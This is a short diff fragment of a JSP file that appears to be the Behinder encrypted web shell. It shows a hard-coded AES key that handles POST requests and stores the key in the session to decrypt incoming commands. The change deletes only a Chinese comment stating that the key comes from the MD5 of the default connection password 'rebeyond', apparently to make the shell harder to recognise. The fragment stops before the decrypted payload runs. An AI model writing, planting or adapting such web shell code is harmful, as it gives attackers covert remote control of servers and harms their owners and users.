@@ -9,7 +9,7 @@
 }%>
 <%
     if (request.getMethod().equals("POST")){
-        String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
+        String k="e45e329feb5d925b";
         session.putValue("u",k);
         Cipher c=Cipher.getInstance("AES");
         c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
